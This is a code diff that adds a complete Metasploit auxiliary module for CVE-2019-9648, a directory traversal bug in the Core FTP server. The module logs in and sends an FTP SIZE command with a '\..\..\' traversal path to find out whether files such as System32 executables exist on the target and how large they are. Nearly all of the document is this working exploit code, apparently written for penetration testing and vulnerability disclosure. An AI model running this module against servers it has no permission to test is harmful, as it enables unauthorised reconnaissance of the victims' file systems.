@@ -1,0 +1,48 @@
+class MetasploitModule < Msf::Auxiliary
+  include Msf::Exploit::Remote::Ftp
+  include Msf::Auxiliary::Scanner
+  include Msf::Auxiliary::Report
+  def proto
+     'ftp'
+  end
+  def initialize
+    super(
+      'Name' => 'CVE-2019-9648 CoreFTP FTP Server Version 674 and below SIZE Directory Traversal',
+      'Description' => %q{An issue was discovered in the SFTP Server component in Core FTP 2.0 Build 674. A directory traversal vulnerability exists using the SIZE command along with a \..\..\ substring, allowing an attacker to enumerate file existence based on the returned information},
+      'Author' => [ 'Kevin Randall' ],
+      'License' => MSF_LICENSE,
+      'References' =>
+        [
+           [ 'CVE', '2019-9648' ],
+           [ 'BID', '107446' ],
+           [ 'URL', 'https://www.coreftp.com/forums/viewtopic.php?f=15&t=4022509' ]
+        ],
+       'Disclosure Date:' =>  'March 13 2019'
+    )
+    register_options([
+      Opt::RPORT(21),
+      OptString.new('FILENAME', [true, "Name of file to search on remote server", 'nslookup.exe'] ),
+      OptString.new('PATHTRAVERSAL', [true, "Traversal path Note: Default Drive used is C: ", "\\..\\..\\..\\..\\"] ),
+      OptString.new('PATHTOFILE', [ true, 'local filepath to the specified file. Please add double slashes for escaping', 'Windows\\System32\\'] )
+    ])
+  end
+    def run_host(ip)
+     print_status("Logging into FTP server now with supplied credentials")
+     c = connect_login
+     return if not c
+     print_status("Performing exploitation of the SIZE command to enumerate files")
+     path = datastore['PATHTRAVERSAL'] + datastore['PATHTOFILE'] + "\\" + datastore['FILENAME']
+     res = send_cmd( ['SIZE', "C: ", path ], true, nsock = self.sock)
+     data = res.to_s
+     print_status("Performing analysis.... Please wait")
+     if (data.include? "213" )
+             print_good ("And the circle hits the square!")
+             print_good ("File Exists. Here is the filesize:"+ data[4..-1])
+       return res
+     else
+             print_error("Mission Failed We'll get them next time!")
+             print_error ("Something went wrong or the file does not exist. Please check your variables PATHTRAVERSAL and PATHTOFILE (please escape double backslash) or verify file extension as it may be incorrect")
+       return res
+     end
+   end
+ end
